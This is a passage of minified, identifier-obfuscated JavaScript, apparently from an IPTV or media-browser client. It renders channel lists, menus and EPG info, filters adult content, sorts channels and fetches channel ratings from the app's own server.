j=0;j<c.menu[i].submenu.length;j++){var el=c.menu[i].submenu[j];li+="<li class='default' id='menu"+i+"sub"+j+"'"+lIlI11I1I_q0000I1Ypr(1,[" onmousemove=\"if(parent.handler=='menu'&&parent.menuSubSel!="+j+") {parent.setSelect(-3);parent.menuSel="+i+";parent.menuSubSel="+j+";parent.menu_sel();}\" onclick=\"parent.menuSel="+i+";parent.menuSubSel="+j+";parent.menu_play();\"",""])+" style='margin:2px 0px;width:100%;overflow:hidden;line-height:"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.7)+"px;'><img onerror=\"this.onerror=null;this.style.display='none';\" height='"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.7)+"' style='float: left;' src='"+_img(el.logo_30x30)+"' /> "+el.title+"</li>"}
li+="</ul>"}
var ci=gV(c.menu[i],"logo_30x30");if(ci=="hidden"||ci=="none"||ci==""||maJor.box_low||lIlI11I1I_q0000I1Ypr(12))var logo="";else logo="<img onerror=\"this.onerror=null;this.style.display='none';\" height='"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.7)+"' style='float: left;' src='"+_img(c.menu[i].logo_30x30)+"' /> ";hmenu+=gV(c.menu[i],"before")+"<div id='menu"+i+"' class='itemmenu default' "+lIlI11I1I_q0000I1Ypr(1,[" onmousemove=\"if(parent.handler=='menu'&&(parent.getSelect()!=-3||parent.menuSel!="+i+")) {parent.menuSubSel=-2;parent.setSelect(-3);parent.menuSel="+i+";parent.linkOver();}\" onclick=\"if(parent.menuSubSel!=-2) parent.menu_hideSub();else{parent.menuSel="+i+";parent.menu_play();}\"",""])+" style='height:"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.80-1)+"px;'><div style='overflow:hidden;max-width:"+wi+"px;height:"+Math.ceil(ll0IO0OIxzk1llIIOYpr*0.80-1)+"px;'>"+logo+c.menu[i].title+"</div>"+li+"</div>";hmenu+=gV(c.menu[i],"after")}
hmenu+="</div>"}catch(e){kjtYpr.popUp("Error menu on this site<br>"+e.message,2000)}}
if(c.aside_items().length){var res="";maJor.each(c.aside_items(),function(v,i){res+=gV(v,"before")+"<div id='aside"+i+"' class='aside_default' style='"+gV(v,"style")+"'"+lIlI11I1I_q0000I1Ypr(1,[' onmousemove="parent.gP().aside_el_over('+i+');" onclick="parent.gP().aside_el_click('+i+', event);"',""])+"'><img style='float: left;"+gV(v,"img_style")+"' src='"+_img(v.logo_30x30)+"' /> "+v.title+"</div>"+gV(v,"after")});if(res){hmenu+="<div id='aside' class='aside_hide'"+lIlI11I1I_q0000I1Ypr(1,[' onclick="parent.gP().aside_event_click(event)" onmouseover="parent.gP().aside_event_over();" onmouseleave="parent.gP().aside_event_out();"',""])+">"+res+"</div>"}}
maJor.statusbar("Load elements: "+c.channels.length);if(c.IS_SUBMENUURL){$_("subsite").style.display="block"}else{if($_("subsite").style.display=="block"){var ifr=$_("subsite").contentWindow||($_("subsite").contentDocument.document||$_("subsite").contentDocument);ifr.document.open();ifr.document.close();$_("subsite").style.display="none"}}
var iframe=$_(c.siteid);iframe=iframe.contentWindow||(iframe.contentDocument.document||iframe.contentDocument);if(!iframe.document)return maJor.inf("Error create document","red",2);iframe.document.open();iframe.document.write("<!DOCTYPE html><html><head>"+"<style>"+c.lOIQIlu0lCO0l0lYpr()+' '+gV(c.global,"css").replace(/(\\|')/g,"").replace(/"/g,'\"')+"</style>"+c.addLinks()+"</head><body onmousemove=\"parent.screensavertimer=-1;\" id=\"sitebody\" style=\"border:none;margin:0px; padding:0px;zoom:"+maJor.params.get("zoom")+"%;\" ontouchmove=\"parent.t_e();\" ontouchend=\"parent.t_e();\">"+"<div id=\"scrollsite\" class=\"site\" style=\"height:"+((maJor.screen().h*100/maJor.params.get("zoom"))-siteTop).toFixed(0)+"px;\" onscroll=\"if(parent.handler!='menu') event.preventDefault();else parent.scrollSite();\"></div>"+"<div id=\"bbot\" class=\"buttons\"></div>"+"</body>"+"<script>"+"document.addEventListener(\"keydown\",parent.keyHandler,false);"+"var $=parent.$;"+"</script>"+"</html>");iframe.document.close();c.setload=1;onloadtimer=setInterval(function(){if($_("scrollsite")&&c.setload&&insetActive==pq.l10I0O1I1lRl0QlI1OYpr.id){c.setload=0;buff.cleartop();clearInterval(onloadtimer);$_("scrollsite",'<div id="zpanel" style="display:none;width:100%;height:100%;overflow-y:scroll;z-index:2; padding: 10px;"></div><div id="description" class="description"></div> <div id="controlcontent" style="padding-bottom: 43px;float: left;width:100%;margin:0px;text-align:'+((gV(c.global,"align")=="")?"center":gV(c.global,"align"))+';"><div id="content"></div></div>');if(c.l10I0O1I1lRl0QlI1OYpr.loadPage!=null){c.l10I0O1I1lRl0QlI1OYpr.INC=c.l10I0O1I1lRl0QlI1OYpr.loadPage.inc;c.l10I0O1I1lRl0QlI1OYpr.page=c.l10I0O1I1lRl0QlI1OYpr.loadPage;c.l10I0O1I1lRl0QlI1OYpr.isLoading=0;delete c.l10I0O1I1lRl0QlI1OYpr.loadPage}else c.l10I0O1I1lRl0QlI1OYpr.INC=c.inc;c.l10I0O1I1lRl0QlI1OYpr.lastResel="";c.hmenu=hmenu;c.renderChannels(getSelect());if(!pq.goBack)lll1IlIlOBP_II1lYpr(c);var def=gVs(pq.elCh,"defaultSelect")||gVs(c.global,"returnSelect")||gVs(c.global,"defaultSelect")||0;c.global.returnSelect="";c.l10I0O1I1lRl0QlI1OYpr.focused(def);if(gV(c.global,"returnTop")>0){buff.scrollsitetop(c.global.returnTop);c.global.returnTop=""}
set_times();if(maJor.params.get("rate")>0)c.get_rates();if(c.IFRAMES.length==0)c.cancel();if(c.aside_exist()){$_("scrollsite").style.paddingLeft="44px"}}},80)}else{}
oInset.renderInset();$_("imgkb3").src=_img(c.l10I0O1I1lRl0QlI1OYpr.fwhistory.length?"_ST_page_fwd.png":"_ST_page_fwd_off.png");$_("imgkb2").src=_img(c.l10I0O1I1lRl0QlI1OYpr.history.length>1?"_ST_page_back.png":"_ST_page_back_off.png?ndate221006_");if(maJor.aevent){maJor.aevent();maJor.aevent=null}}catch(e){jsshowErr(" Render page "+e.message)}},validate:function(s){if(s.indexOf("<style>")>=0){s=s.replace(/<style.*?>.*?<\/style>/g,'<small>Deprecated $_PL["style"] Use new global tag $_PL["css"] Detail at http://bit.ly/3LLZXnD</small>')}
return s},epgAppend:function(b1,b2){var c=this;var top_t=buff.scrollsitetop()-maJor.screen().h;var top_b=top_t+(maJor.screen().h*3);if(!l0OII100kdNdQl01lYpr()&&c.is_iptv>2){var x1=getSelect()-20;var x2=getSelect()+20;if(b1!=null)x1=b1;if(b2!=null)x2=b2;if(x1<0)x1=0;if(x2>c.channels.length)x2=c.channels.length;for(var i=x1;i<x2;i++){if(c.getTypePos(c.channels[i],i)=="list"&&$_("ch"+i)){if(c.channels[i].epgnow){var ch_pos=buff.chtop(i);if(ch_pos>top_t&&ch_pos<top_b){var title=c.channels[i].display_title||c.channels[i].title;if(title==""||title==" ")title=gV(c.channels[i],"playlist_url").replace(/^https?:\/\//,"");$_("titleid"+i,"<div class='epgname'>"+""+title+"</div>"+"<div style='float:right;width:59%;text-align:left;font-size:23px;'><div class='epgtitle'>"+c.channels[i].epgnow.title+"</div><div style='float:right;width: 14%;font-size: 90%;'>"+c.channels[i].epgnow.time+"</div><br>"+"<div style='width:100%;height:4px;background-color:#666666;'>"+"<div class='epgcur' style='width:"+c.channels[i].epgnow.cur+"%;'></div>"+"</div>"+"</div>")}else if(ch_pos>top_b)break}}}}},get_rates:function(){var c=this;if(rates[c.lO10111O0001lOl00Ypr])c.set_rates(rates[c.lO10111O0001lOl00Ypr]);else{var s="";for(var i=0;i<c.channels.length;i++){if(gV(c.channels[i],"playlist_url").indexOf("http")==0){var k=md5(c.channels[i].playlist_url);if(s.indexOf(k)==-1){if(s!="")s+="-";s+=k}}}
if(s)uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?do=get&u="+s).parse=function(s){var m=lIlI1VBOOlI01QYpr(s);if(m){rates[c.lO10111O0001lOl00Ypr]=m;c.set_rates(m)}}}},set_rates:function(m){var c=this;if(maJor.params.get("pr")>0)var backgrOp="background:none #123313;";else backgrOp="";if(!c.channels)return;for(var i=0;i<c.channels.length;i++){if(gV(c.channels[i],"playlist_url").indexOf("http")==0){var x=md5(c.channels[i].playlist_url);if(m[x]){c.channels[i].rates=m[x];var sum=0;if(m[x][0]||m[x][1]){sum=parseInt(m[x][0])+parseInt(m[x][1]);var proc=Math.ceil(100*(m[x][1]/sum));c.channels[i].rates[2]=proc;if($_("rat"+i)){$_("rat"+i).style.display="block";$_("rat"+i,"<span style='color:#54d659;padding:1px 2px;font-size:12px;"+backgrOp+"'>"+proc+"%</span><br><span style='color:#c7c1c1;padding:1px 2px;font-size:10px;"+backgrOp+"'>"+sum+"</span>")}}
c.channels[i].rates[3]=sum}}}},renderIcons:function(n){var c=this;var top_t=(buff.scrollsitetop()*0.75).toFixed(0);var top_b=(buff.scrollsitetop()+($_("site").offsetHeight*2)*1.25).toFixed(0);var x1=n-50;var x2=n+50;if(x1<0)x1=0;if(x2>c.channels.length-1)x2=c.channels.length-1;for(var i=x1;i<=x2;i++){if($_("ch"+i)!=null){if($_("ch"+i).style.display=="none")$_("ch"+i).style.display="";if($_("img"+i)!=null){var ch_pos=buff.chtop(i);if(ch_pos>=top_t&&ch_pos<top_b){var ds=$_("img"+i).getAttribute('data-src');if(ds){$_("img"+i).setAttribute('src',ds);$_("img"+i).setAttribute('data-src',"")}}else if(ch_pos>top_b){break}}}}},renderChannels:function(n,mode,gA,el){var c=this,x1;if(insetActive!=c.l10I0O1I1lRl0QlI1OYpr.id)return;runtime=Date.now();if(isScreensaver){screensaver_mod(0)}
var numL=gP("typeList")=="list"?30:50;numL=numL*($_("site").offsetHeight/720)*(maJor.params.get("zoom")/100);if(n==null){for(var i=0;i<c.channels.length;i++){if(buff.chtop(i)>=buff.scrollsitetop()){x1=i;break}}
if(x1==null){x1=0;var x2=c.channels.length}else{x1-=numL;x2=x1+numL*2}}else{x1=1*n-numL;x2=1*n+numL}
x1=Math.ceil(x1);x2=Math.ceil(x2);if(goBack)x1=0;if(gV(mode)=="update"||gV(mode)=="iframe"){if(prev[c.SAVE_lO10111O0001lOl00Ypr])prev[c.SAVE_lO10111O0001lOl00Ypr].channels=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.channels))}
if(c.count!=c.channels.length||gV(mode)=="update"||gV(mode)=="iframe"||!$_("content")||!$_("content").innerHTML){var html="";c.channels=c.alltagswch(c.channels);elementPool=[];c.upPos();for(var i=0;i<c.channels.length;i++){var Ch=c.channels[i];if(Ch){Ch.imgsrc=Ch.logo_30x30||"";var dop="";if(i>x2){dop=' style="display:none;"'}
html+=c.renderCh(Ch,i,dop)}}
if(c.hscroll){html+="</div>";c.hscroll=0}
if(c.deprecated&&c.deprecated.length&&c.lO10111O0001lOl00Ypr.indexOf("http")==0)var depr='<div style="font-size:40%;color:gray;">'+c.deprecated.join(" and ")+'</div>';else depr="";$_("content",(c.hmenu||"")+depr+c.validate(gV(c.global,"before")+html+gV(c.global,"after")));c.count=c.channels.length;if(n!=null){c.l10I0O1I1lRl0QlI1OYpr.lastselect=n;c.l10I0O1I1lRl0QlI1OYpr.mark(n,1)}}
var nSel=n||getSelect();for(var i=0;i<c.channels.length;i++){if(typeof c.channels[i]=="undefined"){}else if($_("ch"+i)){if(i>=x1&&i<=x2){$_("ch"+i).style.display="";if($_("img"+i)!=null){var ds=$_("img"+i).getAttribute('data-src');if(ds){$_("img"+i).setAttribute('src',ds);$_("img"+i).setAttribute('data-src',"")}}
if(c.channels.length>3&&nSel>=0.7*i&&i-nSel<10&&c.canceled&&c.channels[i].onshow&&typeof c.channels[i].onshow=="object"&&!c.IFRAMES.length){c.iframeajax=1;c.canceled=0;c.channels[i].iframeid=i;c.channels[i].iframe="0";c.channels[i].iframetype="ajax";var t=c.channels[i].onshow;t.iframeid=i;t.iframe="0";t.iframetype="ajax";c.IFRAMES.push(t);delete c.channels[i].onshow;if($_("titleid"+i)&&gVs(t,"title")!=="")$_("titleid"+i,gV(t,"title"));if($_("img"+i)&&gVs(t,"logo_30x30")!=="")$_("img"+i).src=gV(t,"logo_30x30")}}}}
c.epgAppend(x1,x2);var nvinfo=c.typeSource;if(c.iframeajax||(!c.canceled&&mode!="focused")){var olu="";c.iframeajax=0;var fbr=0;if(c.IFRAMES.length){for(var i in c.IFRAMES){if(typeof c.IFRAMES[i].src=="undefined"){if(olu.indexOf("--"+c.IFRAMES[i].playlist_url+"--")>=0)continue;c.IFRAMES[i].src=1;for(var j in c.channels){if(c.channels[j].iframeid==c.IFRAMES[i].iframeid){if($_("img"+j))$_("img"+j).src=_img("_ST_b_loading.gif?ifr");break}}
nvinfo+=" "+((++c.IFRAMES_INSERT)+"/"+c.IFRAMES.length);fbr=1;setTimeout(function(){if(!c.canceled)c.l10I0O1I1lRl0QlI1OYpr.navigate(c.IFRAMES[i])},50);break}
olu+="--"+c.IFRAMES[i].playlist_url+"--"}
if(!fbr){c.IFRAMES=[];for(var i in c.channels){c.channels[i].iframe="";c.channels[i].iframeid=""}
c.cancel()}}}
$_("navinfo2",nvinfo);if(nvinfo)$_("navinfo2").style.display="inline";else $_("navinfo2").style.display="none";if(!gA)return;titleRoll.stop();if(n!=null)gA.select=n;if(isNaN(gA.select))gA.select=0;oInset.panel.setpanel();if(gA.select>=c.channels.length)gA.select=c.channels.length-1;if(gA.select>0)var cnt=0;else cnt=gA.select;if(gA.select!=-1)insetSelect=insetActive;var hsh=cnt+" "+menuSel+" "+menuSubSel+" "+sdbarSel+" "+insetSelect+" "+insetActive+" "+gA.getTitle();if(sdbar!=null)hsh+=" "+sdbar.length;if(gA.page&&(c.is_mark||c.marked)){if(!c.is_mark){c.is_mark_array={};c.marked=0}
for(var i=0;i<c.channels.length;i++){if($_("titleid"+i)){if(c.is_mark_array[i]){c.marked=1;$_("titleid"+i).style.color="#b40c00";$_("titleid"+i).style.fontWeight="bold";$_("titleid"+i).style.border="1px solid red"}else{$_("titleid"+i).style.color="";$_("titleid"+i).style.fontWeight="";$_("titleid"+i).style.border=""}}}}
if(gA.lastResel!=hsh){oInset.renderInset();menu_sel();c.l1l1IOI0Cg_0KIIlll0Ypr();sidebar_sel();oInset.omniSel();gA.lastResel=hsh}
if(gA.lastselect!=gA.select&&gA.lastselect!=null&&$_("ch"+gA.lastselect)!=null)gA.mark(gA.lastselect,0);if(gA.select>=0){gA.mark(gA.select,1,el);if(!el){var cs=gA.select;if($_("ch"+cs)){var ch_pos=buff.chtop(cs)-buff.scrollsitetop();var site_bot=$_("scrollsite").offsetHeight;var y_t=Math.ceil($_("ch"+cs).offsetTop-site_bot*0.18);var y_b=Math.ceil($_("ch"+cs).offsetTop+$_("ch"+cs).offsetHeight-site_bot*0.87);progScroll=1;if($_("ch"+cs).offsetTop<$_("scrollsite").offsetHeight*0.5||cs<1)buff.scrollsitetop(0);else if(gA.lastselect>=0&&gA.lastselect<c.channels.length&&(gA.select-gA.lastselect==-10||gA.select-gA.lastselect==10)){var ch_lastpos=$_("ch"+gA.lastselect).offsetTop-buff.scrollsitetop();buff.scrollsitetop(buff.scrollsitetop()+ch_pos-ch_lastpos)}else if(y_t<buff.scrollsitetop()){buff.scrollsitetop(y_t)}else if(y_b>buff.scrollsitetop()){buff.scrollsitetop(y_b)}
if(n)gP().renderIcons(n);if(gP("haswrap")){var ch_right=buff.chright(cs);var sleft=$_("ch"+cs).parentNode.scrollLeft;var sw=$_("ch"+cs).parentNode.offsetWidth;var wl=$_("ch"+cs).offsetLeft-sw*0.12;var wr=ch_right-sw*0.85;if($_("ch"+cs).offsetLeft<sw*0.4)$_("ch"+cs).parentNode.scrollLeft=0;else if(wl<sleft)$_("ch"+cs).parentNode.scrollLeft=wl;else if(wr>sleft)$_("ch"+cs).parentNode.scrollLeft=wr}}}
runtime=Date.now()-runtime}
gA.lastselect=gA.select;gA.hint()},getSubI:function(x,ch){var c=this;if(!ch)return null;if(x.length===1&&ch[x[0]]){return ch[x[0]].submenu}else if(ch[x[0]]){ch=ch[x.shift()].submenu;return c.getSubI(x,ch)}
return null},ord_id:function(){var x=this.lO10111O0001lOl00Ypr.split("#")[0];var nm=md5(x);return nm},reordered:function(ch){var nm=this.ord_id();if(maJor.ordered&&maJor.ordered[nm]){var orderMap=maJor.ordered[nm];ch.sort(function(a,b){var orderA=orderMap[a.origsel]||0;var orderB=orderMap[b.origsel]||0;return orderB-orderA})}
return ch},alltagswch:function(channels){var c=this;if(!channels||channels.length===0||!c.global){return channels}
var alltags={};for(var i in c.global){if(String(i)=="advertising")alltags.advertising=c.global[i];if(String(i).indexOf("all_")==0)alltags[String(i).substr(4)]=c.global[i]}
if(!Object.keys(alltags).length)return channels;for(var i in channels){var channel=channels[i];for(var key in alltags){if(key==="advertising"&&!channel.stream_url)continue;var channelValue=gV(channel,key);if(channelValue===""){channel[key]=alltags[key]}else{channel[key]=String(channelValue).replace("all_"+key,alltags[key])}}}
return channels},toChannels:function(pq){var c=this;try{if(gP())gP().aside_close();c.reallinks=0;if(c.canceled){return}
c.l10I0O1I1lRl0QlI1OYpr=pq.l10I0O1I1lRl0QlI1OYpr;if(!c.l01lI10Il1zvj10lI1Ypr){if(c.handlerData(pq)){is_loadpage(0);return}}
if(c.canceled){is_loadpage(0);return}
if(pq.data.window)c.IS_SUBMENUURL=1;if(!pq.data.channels&&!pq.data.before){}
var channels=pq.data&&pq.data.channels;if(channels&&channels.length>0){var title=String(channels[0].title);if(title.match(/(Нет данных|Здесь пусто)/)){c.ERR=0}}else if(c.l01lI10Il1zvj10lI1Ypr){if(gV(pq.elCh,"iframetype")!="ajax"){pq.data.channels=[{"title":"Ничего не найдено!"}]}}
var m=c.lO10111O0001lOl00Ypr.match(/^(https?:\/\/(?:www\.|m\.)?[^:\/?#]+)/);if(m){c.XML_BASE=m[1];var dm=c.XML_BASE.match(/^https?:\/\/(?:www\.|m\.)?([^:\/?#]+)/);c.XML_DOMAIN=dm?dm[1]:"localhost"}else{c.XML_BASE="http://localhost";c.XML_DOMAIN="localhost"}
if(c.SAVE_lO10111O0001lOl00Ypr.indexOf("view-source:")!==0)prev[c.SAVE_lO10111O0001lOl00Ypr.split("#submenu")[0].split("#group=")[0]]=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(pq.data));if(c.lO10111O0001lOl00Ypr.indexOf("#submenu")>0){var x=c.lO10111O0001lOl00Ypr.split("#submenu");x.shift();var ch=c.getSubI(x,pq.data.channels)||[];pq.data.channels=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(ch));pq.data.title="";pq.data.navigate=""}
var m=c.lO10111O0001lOl00Ypr.match(/#.*?catchup=(.*?)(&|$|#)/);if(m!=null)c.global.catchup=m[1];var m=c.lO10111O0001lOl00Ypr.match(/#.*?catchup-days=(.*?)(&|$|#)/);if(m!=null)c.global.catchup_days=m[1];c.deprecated=[];if(String(gV(pq.data,"is_iptv")).match(/true|1/i))c.is_iptv=10;else if(String(gV(pq.data,"is_iptv")).match(/false|0/i))c.is_iptv=-1;if(pq.data.style&&gV(pq.data,"css")==""){for(var i in pq.data.style){}
c.deprecated.push('This site use deprecated $_PL["style"] Please use new global tag $_PL["css"] Detail at http://bit.ly/3LLZXnD')}
if(String(gV(pq.data,"css")).match(/important/)){c.deprecated.push('This site use illegal !important tags in $_PL["css"] Please delete It`s');pq.data.css=pq.data.css.replace(/!.*?important/g,"important")}
for(var i in pq.data){var v=pq.data[i];if(i=="menu"){for(var j in v){if(gVs(v[j],"playlist_url").indexOf("AddSearch(")==0&&lIQlI1lSe1pI1lQIYpr(gV(v[j],"playlist_url"))){}else if(gVs(v[j],"playlist_url").indexOf("AddFavorite(")==0&&l0lIIvk1FXOIO01Ypr(gV(v[j],"playlist_url"))){}else c.menu.push(v[j])}}else if(i=="channels"){maJor.each(c.alltagswch(v),function(w){var ttl=gVs(w,"title");if(typeof w.br!="undefined"){c.br=1}
if(String(gV(w,"description")).match(/<strong><span style="color: #ff9900;">Идентификатор устройства/)){c.deprecated.push("<div style='font-weight:bold;color:orange;font-size:28px;'>Вам необходимо иметь регистрацию на сайте http://forktv.me/ (открывать в веб-браузере) и добавить там это устройство.<br>"+"<img src='http://46.36.220.208/img/fme.png' align=left style=''></div><br clear=left>")}
if(w.coordination){c.hascoords=1}
if(gV(w,"position")!="")c.is_html=1;if(gV(w,"iframe")!==""){w.iframelogo=gV(w,"logo_30x30");if(c.l01lI10Il1zvj10lI1Ypr){w.iframeid=gV(pq.elCh,"iframeid")+"-"+c.channels.length;c.l10I0O1I1lRl0QlI1OYpr.page.IFRAMES.push(w)}else{w.iframeid=c.channels.length;c.IFRAMES.push(w)}}
w.stream_url=gVs(w,"stream_url");if(gV(w,"search_on")==""&&(String(gV(w,"playlist_url")+gV(w,"stream_url")).match(/^(http|udp)/)||gV(w,"parser").match(/^(http)/)))c.reallinks++;if(gVs(w,"playlist_url").indexOf("payd_")==0){c.input[w.playlist_url.substr(5)]=gV(w,"value")}
if(c.lO10111O0001lOl00Ypr.indexOf("http")===0){var keys=["playlist_url","stream_url","logo_30x30","parser"];for(var i=0;i<keys.length;i++){var key=keys[i];if(w[key]&&gVs(w,key).indexOf("/")===0){w[key]=c.XML_BASE+gV(w,key)}}}
if(w.stream_url){if(w.stream_url.match(/\.(m3u|xml|txt)$/i)){w.playlist_url=w.stream_url;w.stream_url=""}else if(!l0OII100kdNdQl01lYpr(c.lO10111O0001lOl00Ypr)&&c.is_iptv>=0&&c.is_iptv<4){if(fEpg.l0O1llI11slaPkOIlI0Ypr(w)!=="")c.is_iptv++;if(w.jtvname)c.is_iptv++;if(ttl.length<27){ttl=String(ttl).toLowerCase();if(JtvC[ttl]||JtvE[ttl]){c.is_iptv++}else if(ttl.match(/^(discovery|россия|СТС|тнт| канал|канал |brazzers tv|hustler |Amedia|Пиксель|Nickelodeon|ПлюсПлюс|Карусель|Малятко|Boomerang|Охота и рыбалка|Матч|CBS|Bridge|MTV |Music Box|CNN|LifeNews|Russia Today|TV |TV-|Eurosport|National Geographic|Nat Geo|History|Viasat|Animal Planet|1\+1|Интер|ICTV|НТН|Мега|Zoom|XSPORT|ТЕТ|Новий канал|Enter-фильм|Еспресо|5 канал|24 канал|Прямий|Україна|НЛО TV|К1|К2|Культура|Рен ТВ|Первый канал|НТВ|Че|Домашний|Пятница|Муз-ТВ|РБК|Арти|Кино ТВ|ТВ Центр|Спас|Звезда|RT|DW|BBC|Fox|HBO|Cartoon Network|TV1000|Sony Channel|AXN|Al Jazeera|France 24|ТРК Украина|Беларусь 24|Известия |Дождь |Белсат |РБК )/i)){c.is_iptv++}else if(ttl.match(/ tv( |$)/i)){c.is_iptv++}}}
if(pq.elCh&&pq.elCh.child_event&&!w.event){w.event=pq.elCh.child_event}}
if(gV(w,"group")!==""){var k=w.group.split(";");for(var jk=0;jk<k.length;jk++){if(!in_array(k[jk],c.group))c.group.push(k[jk])}}
if(gV(w,"location")>0){if(typeof pq.l10I0O1I1lRl0QlI1OYpr.page!="undefined"){if(typeof prev[pq.l10I0O1I1lRl0QlI1OYpr.page.SAVE_lO10111O0001lOl00Ypr]!="undefined")prev[pq.l10I0O1I1lRl0QlI1OYpr.page.SAVE_lO10111O0001lOl00Ypr].cacheinfo="nocache"}
if(w.location==2){}
c.haslocation=1;return pq.l10I0O1I1lRl0QlI1OYpr.navigate(w)}
if(maJor.params.get("adult")==0&&c.lO10111O0001lOl00Ypr.match(/^(http|about:blank|submenu)/)&&(String(gV(w,"group")).match(/взрослы/i)||is_xxx(gV(w,"group"))||is_xxx(gV(w,"infolink"))||is_xxx(gV(w,"title"))||is_xxx(gV(w,"playlist_url"))||is_xxx(gV(w,"stream_url")))){if(c.lO10111O0001lOl00Ypr.match(/^about:blank/))return;w.title="This content hidden in your settings!";w.description="This content hidden in your settings!";w.logo_30x30=_img("_ST_sensitive.png");w.stream_url="";w.infolink="";w.playlist_url="cmd:info(Adult content hidden in your settings!);"}
if(gVs(w,"playlist_url").indexOf("AddSearch(")==0&&lIQlI1lSe1pI1lQIYpr(gVs(w,"playlist_url"))){}else if(gVs(w,"playlist_url").indexOf("AddFavorite(")==0&&l0lIIvk1FXOIO01Ypr(gVs(w,"playlist_url"))){}else c.channels.push(w)})}else if(i=="typeList"&&v!="")c.typeList=v;else{c.global[i]=v;if(i.replace&&v!==""){c.global[i.replace("-","_")]=v;c.global[i.replace("_","-")]=v}}}
if(c.haslocation)return;if(c.hascoords)c.deprecated.push('Site use deprecated $_CH["coordination"] Please use new channel tag $_CH["br"]=1 for new line');if(gV(c.global,"next_page_url")){var x={"logo_30x30":_img("_ST_right.png"),"title":"Next page","playlist_url":gV(c.global,"next_page_url"),"onshow":{"logo_30x30":_img("_ST_b_loading.gif"),"title":"Load next page...","playlist_url":gV(c.global,"next_page_url"),"iframeid":c.channels.length,"iframe":0,"iframetype":"ajax"}};if(gV(pq.elCh,"local"))x.onshow.local=pq.elCh.local;if(c.l01lI10Il1zvj10lI1Ypr&&gV(pq.elCh,"iframetype")!="ajax")x.onshow=null;c.channels.push(x);c.global.next_page_url=""}
if(pq.tosource){c.l10I0O1I1lRl0QlI1OYpr.navigate("view-source:"+c.lO10111O0001lOl00Ypr.replace("view-source:",""));pq.tosource=0;return}
if(c.l01lI10Il1zvj10lI1Ypr&&c.channels.length>0){var xp=pq.elCh.iframe.split(",");if(xp.length>1)c.IFRAMES_INSERT=parseInt(xp[1]);for(var i in c.l10I0O1I1lRl0QlI1OYpr.page.channels){if(c.l10I0O1I1lRl0QlI1OYpr.page.channels[i].iframeid==pq.elCh.iframeid){if(isNaN(c.IFRAMES_INSERT)||c.IFRAMES_INSERT<1)c.IFRAMES_INSERT=i;var x=c.l10I0O1I1lRl0QlI1OYpr.page.channels.splice(i,1);var jpush=0;for(var j=0;j<c.channels.length;j++){if(gV(c.global,"startcontent")>0){if(j<c.global.startcontent)continue}
if(gV(c.global,"endcontent")!=""&&gV(c.global,"endcontent")>=0){if(j>c.global.endcontent)continue}
if(gV(pq.elCh,"iframetype")=="ajax"){}else{if(!c.channels[j].stream_url&&!c.channels[j].playlist_url)continue;if(pq.elCh.excludetitlematch&&String(c.channels[j].title).match(new RegExp(gV(pq.elCh,"excludetitlematch"),"ig")))continue;else if(String(c.channels[j].title).match(/(не найдено|здесь пусто|следующая стр|нет результатов)/i))continue;if(String(pq.elCh.logo_30x30).match(/^(http|_)/))c.channels[j].logo_30x30=pq.elCh.iframelogo;c.channels[j].position=gV(pq.elCh,"position");if(gV(pq.elCh,"template"))c.channels[j].template=gV(pq.elCh,"template");if(gV(pq.elCh,"br")!=="")c.channels[j].br=gV(pq.elCh,"br");if(pq.elCh.position&&pq.elCh.position=="list")c.channels[j].before=c.channels[j].after="";if(pq.elCh.before)c.channels[j].before=pq.elCh.before+gV(c.channels[j],"before");if(pq.elCh.after)c.channels[j].after=pq.elCh.after+gV(c.channels[j],"after");pq.elCh.before=pq.elCh.after="";if(gV(c.channels[j],"iframe")!="")c.channels[j].iframe=pq.elCh.iframe}
c.channels[j].sourceurl=c.lO10111O0001lOl00Ypr;if(x!=null){if(gV(x,"br"))c.channels[j].br=gV(x,"br");x=null}
if(isNaN(xp[0])||xp[0]<1||xp[0]>jpush||gV(c.channels[j],"iframe")!=""){c.l10I0O1I1lRl0QlI1OYpr.page.channels.splice(c.IFRAMES_INSERT++,0,c.channels[j]);jpush++}else c.l10I0O1I1lRl0QlI1OYpr.page.channels.push(c.channels[j])}
break}}}
if(c.lO10111O0001lOl00Ypr=="cmdEpg")c.is_iptv=3;if(c.is_iptv>2){if(gV(c.global,"url_tvg")!=""){fEpg.loadxmltv(gV(c.global,"url_tvg"),c);fEpg.add(c,3000)}else fEpg.add(c);if(maJor.params.get("sortiptv")>0&&c.lO10111O0001lOl00Ypr.indexOf("http")===0){c.channels.sort(function(a,b){var str1=String(a.title);var str2=String(b.title);if(maJor.params.get("sortiptv")==2){if(str1.charCodeAt(0)<256&&str1.charCodeAt(0)>57)str1="яя"+str1;if(str2.charCodeAt(0)<256&&str2.charCodeAt(0)>57)str2="яя"+str2}
if(typeof str1!=="string"||typeof str2!=="string"){console.error("Invalid data, titles must be strings.");return 0}
var rx=/([^\d]+|\d+)/ig;var str1split=str1.match(rx);var str2split=str2.match(rx);if(!str1split||!str2split){console.error("Match failed for one of the strings.");return 0}
for(var i=0,l=Math.min(str1split.length,str2split.length);i<l;i++){var s1=str1split[i],s2=str2split[i];if(s1===s2)continue;if(isNaN(+s1)||isNaN(+s2)){return s1>s2?1:-1}else{return+s1- +s2}}
return 0})}
if(maJor.ordered){if(typeof c.channels==="object"&&c.channels.length>0){for(var index=0;index<c.channels.length;index++){if(typeof c.channels[index]==="object"){c.channels[index].origsel=index}}
var parsedChannels=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.channels));if(parsedChannels){c.ordchannels=parsedChannels;c.channels=c.reordered(c.channels)}else{jsshowErr("Error sorting channels: failed to serialize channels.",1)}}}}
if(c.l01lI10Il1zvj10lI1Ypr){c.l10I0O1I1lRl0QlI1OYpr.page.renderChannels(getSelect(),"iframe");c.cancel()}else{if(gV(c.global,"icon")=="")c.global.icon=pq.elCh.logo_30x30;if(gV(c.global,"title")=="")c.global.title=pq.elCh.title;if(c.group.length>0){c.group.unshift("_FPALL_");c.origchannels=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.channels));c.listGroup()}
